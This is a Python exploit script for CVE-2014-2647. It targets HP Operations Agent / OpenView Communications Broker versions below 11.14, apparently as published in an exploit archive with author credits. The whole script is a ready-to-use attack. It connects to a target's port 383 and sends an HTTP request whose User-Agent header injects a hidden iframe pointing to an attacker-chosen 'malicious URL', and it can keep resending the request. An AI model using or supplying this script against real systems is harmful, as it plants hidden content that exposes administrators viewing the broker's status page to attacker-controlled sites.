#!/usr/bin/env python3
# Exploit Title: HP Operations Agent / HP Communications Broker Remote XSS iFrame Injection
# Date: 10/16/2014
# Vendor Homepage: www.hp.com
#
# Exploit Author: Matt Schmidt (Syph0n)
# Enhanced for python3: Sayak Naskar (4n0n_54y4k) [github.com/hacky1997]
# 
# Update: 28/07/2019
#
# Version: HP Operations Manager/Operations Agent / OpenView Communications Broker < 11.14
# Tested on: Windows 7, SunOS, RHEL Linux, Windows 10
# CVE : CVE-2014-2647
# Example: ./exploit.py <TargetIP> <iFrame URL> [Port]

import argparse, socket, sys

def banner():
    print("   _____  __      __  ______            ___     ___    __    ___              ___     ___    _  _   _____ ")
    print("  / ____| \ \    / / |  ____|          |__ \   / _ \  /_ |  / . |            |__ \   / __)  | || | |___  | ")
    print(" | |       \ \  / /  | |__     ______     ) | | | | |  | | / /| |   ______      ) | | |___  | || |_    | | ")
    print(" | |        \ \/ /   |  __|   |______|   / /  | | | |  | ||___, |  |______|    / /  |  _  | |__   _|   | | ")
    print(" | |____     \  /    | |____            / /_  | |_| |  | |    | |             / /_  | (_) |    | |     | | ")
    print("  \_____|     \/     |______|          |____|  \___/   |_|    |_|            |____|  \___/     |_|     |_| Developed by Sayak")
	

# Define Help Menu
if (len(sys.argv) < 3) or (sys.argv[1] == '-h') or (sys.argv[1] == '--help'):
    banner()
    print ('\nUsage: ./exploit.py <TargetIP> <iFrame URL> [Port]\n')
    print ('    <TargetIP>: The Target IP Address')
    print ('    <iFrame URL>: Malicious URL that will be injected as a hidden iframe\n')
    print ('Options:')
    print ('	 [--port]: The port the HP Communications Broker is running on, default is 383')
    sys.exit(1)

# Parse Arguments
parser = argparse.ArgumentParser()
parser.add_argument("TargetIP")
parser.add_argument("iFrameURL")
parser.add_argument("--port", type=int, default=383)
args = parser.parse_args()

# Define User Agent to be spoofed
agent = 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)'

# Define Variables
host = args.TargetIP
port = args.port
iFrameURL = args.iFrameURL

def main():
	# Malicious hidden iframe payload that takes input from args.iFrameURL and fake UserAgent from agent_list
	payload = "GET /Hewlett-Packard/OpenView/BBC/status HTTP/1.1\r\nUser-Agent: <iframe height='0' width='0' style='visibility:hidden;display:none' src='"+iFrameURL+"'></iframe><a>"+ agent +"</a>\r\n\r\n"

	# Create Socket and check connection to target.
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print ("[*] Checking host: " +host+"\n")
	try:
		s.connect((host, int(port)))
	except Exception as e:
		print ("[+] Error Connecting: ", e)
		exit()
	print ("[*] Sending payload to HP OpenView HTTP Communication host " +host+"\n")
	
	# Keep connection alive
	while payload != 'q':
		s.send(payload.encode())
		
		s.recv(1024)
		print ("[*] Payload Sent.")
				
		payload = input("\n[+] Keeping Connection Open ([q]uit):")
	return

if __name__ == '__main__':
    banner()
    main()
